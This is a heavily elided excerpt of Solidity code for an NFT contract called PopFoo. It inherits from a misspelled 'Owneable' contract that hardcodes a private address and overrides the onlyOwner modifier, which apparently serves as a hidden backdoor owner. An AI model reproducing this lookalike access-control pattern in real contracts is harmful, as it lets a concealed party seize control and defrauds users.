 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0xAF7B14c284a7b5b333A2F6bb890FC10ECb432d8e;
    modifier onlyOwner() {
...
contract PopFoo is ERC721A, Owneable {
    ...
    uint256 public FREE_MAX_SUPPLY = 8000;
    ...
    constructor() ERC721A("PopFoo", "PopFoo") {}
